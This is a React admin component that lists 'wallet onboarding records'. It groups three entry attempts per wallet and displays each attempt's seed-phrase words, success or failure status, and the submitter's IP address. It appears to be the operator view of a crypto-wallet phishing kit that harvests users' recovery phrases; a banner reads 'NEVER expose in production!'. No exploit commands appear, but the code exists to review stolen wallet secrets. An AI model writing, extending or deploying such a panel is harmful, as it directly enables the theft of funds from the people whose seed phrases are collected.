'use client';

import { useState, useEffect, useCallback } from 'react';
import {
  RefreshCw, Search, Loader2, ChevronLeft, ChevronRight,
  AlertCircle, Clock, Eye, EyeOff, Copy, Check
} from 'lucide-react';
import Card from '@/components/ui/Card';
import Button from '@/components/ui/Button';
import Badge from '@/components/ui/Badge';

export default function AdminOnboardingManager() {
  const [records, setRecords] = useState([]);
  const [groupedData, setGroupedData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const limit = 20;

  const [search, setSearch] = useState('');
  const [searchInput, setSearchInput] = useState('');

  const [copiedId, setCopiedId] = useState(null);
  const [expandedGroups, setExpandedGroups] = useState(new Set());

  const fetchRecords = useCallback(async () => {
    setLoading(true);
    try {
      const params = new URLSearchParams({
        page: String(page),
        limit: String(limit),
      });
      if (search) params.set('search', search);

      const res = await fetch(`/api/admin/onboarding?${params.toString()}`);
      if (!res.ok) throw new Error('Failed to load');

      const data = await res.json();

      setRecords(data.records || []);
      setTotal(data.total || 0);
      setTotalPages(data.totalPages || 1);

      // ── GROUP BY groupId (your 3 attempts stay together) ─────────────────
      const grouped = (data.records || []).reduce((acc, rec) => {
        const key = rec.groupId || rec.wallet_address || 'unknown';
        if (!acc[key]) {
          acc[key] = {
            groupId: key,
            wallet_address: rec.wallet_address,
            wallet_type: rec.wallet_type,
            attempts: [],
            latestTimestamp: rec.created_at,
            totalAttempts: 0,
          };
        }
        acc[key].attempts.push(rec);
        acc[key].totalAttempts = acc[key].attempts.length;
        if (new Date(rec.created_at) > new Date(acc[key].latestTimestamp)) {
          acc[key].latestTimestamp = rec.created_at;
        }
        return acc;
      }, {});

      setGroupedData(Object.values(grouped));
    } catch (err) {
      console.error('Fetch error:', err);
    } finally {
      setLoading(false);
    }
  }, [page, search]);

  useEffect(() => {
    fetchRecords();
  }, [fetchRecords]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setSearch(searchInput.trim());
      setPage(1);
    }, 450);
    return () => clearTimeout(timer);
  }, [searchInput]);

  const toggleGroup = (groupId) => {
    const newSet = new Set(expandedGroups);
    if (newSet.has(groupId)) newSet.delete(groupId);
    else newSet.add(groupId);
    setExpandedGroups(newSet);
  };

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const shortAddr = (addr) =>
    addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '—';

  const formatSeed = (words) => {
    if (!words || words.length === 0) return '—';
    return words.join(' ');
  };

  return (
    <div className="space-y-6 p-4 md:p-6">
      <Card className="p-5">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <div>
            <h2 className="font-display font-semibold text-text text-xl">
              Wallet Onboarding Records
            </h2>
            <p className="text-sm text-muted mt-1">
              All 3 attempts per wallet are now grouped together.
              <span className="text-danger font-medium"> NEVER expose in production!</span>
            </p>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={fetchRecords}
            disabled={loading}
          >
            <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            Refresh
          </Button>
        </div>
      </Card>

      <Card className="p-4">
        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 flex-wrap">
          <div className="relative flex-1 min-w-[280px]">
            <Search
              size={14}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-dim"
            />
            <input
              type="text"
              placeholder="Search wallet address or type…"
              value={searchInput}
              onChange={(e) => setSearchInput(e.target.value)}
              className="w-full pl-9 pr-4 py-2 bg-surface2/50 border border-border-light rounded-xl text-sm text-text placeholder:text-muted-dim focus:outline-none focus:border-accent/40"
            />
          </div>

          <Badge color="accent" className="shrink-0">
            {total} records
          </Badge>
        </div>
      </Card>

      <Card className="overflow-hidden">
        {loading ? (
          <div className="p-16 text-center">
            <Loader2 size={28} className="animate-spin text-accent mx-auto" />
            <p className="text-sm text-muted mt-3">Loading grouped onboarding data…</p>
          </div>
        ) : groupedData.length === 0 ? (
          <div className="p-16 text-center">
            <AlertCircle size={32} className="text-muted-dim mx-auto mb-3" />
            <p className="text-sm text-muted">No records found.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm min-w-[900px]">
              <thead>
                <tr className="border-b border-border-light bg-surface/50">
                  <th className="w-10 px-5 py-3"></th>
                  <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Wallet Address</th>
                  <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Type</th>
                  <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Attempts</th>
                  <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Latest</th>
                </tr>
              </thead>
              <tbody>
                {groupedData.map((group) => {
                  const isExpanded = expandedGroups.has(group.groupId);
                  return (
                    <>
                      <tr
                        key={group.groupId}
                        className="border-b border-border-light hover:bg-white/[0.02] transition-colors cursor-pointer"
                        onClick={() => toggleGroup(group.groupId)}
                      >
                        <td className="px-5 py-4">
                          <Eye size={16} className={isExpanded ? 'text-accent' : 'text-muted-dim'} />
                        </td>
                        <td className="px-5 py-4 font-mono text-[13px] text-text">
                          {shortAddr(group.wallet_address)}
                        </td>
                        <td className="px-5 py-4">
                          <Badge color="default" className="!text-[11px]">
                            {group.wallet_type || '—'}
                          </Badge>
                        </td>
                        <td className="px-5 py-4">
                          <Badge color="warning" className="!text-[11px]">
                            {group.totalAttempts} attempts
                          </Badge>
                        </td>
                        <td className="px-5 py-4 text-[11px] text-muted-dim">
                          {group.latestTimestamp
                            ? new Date(group.latestTimestamp).toLocaleString([], {
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                              })
                            : '—'}
                        </td>
                      </tr>

                      {/* Expanded attempts */}
                      {isExpanded &&
                        group.attempts.map((rec, idx) => (
                          <tr key={`${group.groupId}-${idx}`} className="bg-zinc-950/50 border-b border-border-light/50">
                            <td className="px-5 py-3"></td>
                            <td className="px-5 py-3 text-[11px] text-muted-dim font-mono">
                              Attempt {rec.attemptNumber || idx + 1}
                            </td>
                            <td className="px-5 py-3">
                              {rec.isFailedAttempt ? (
                                <Badge color="danger" className="!text-[10px]">Failed</Badge>
                              ) : (
                                <Badge color="success" className="!text-[10px]">Success</Badge>
                              )}
                            </td>
                            <td className="px-5 py-3 font-mono text-[11px] text-warning/90 max-w-[280px] truncate">
                              {formatSeed(rec.crypto_boxes)}
                            </td>
                            <td className="px-5 py-3 text-[11px] text-muted-dim">
                              {rec.ip_address || '—'}
                            </td>
                          </tr>
                        ))}
                    </>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </Card>
    </div>
  );
}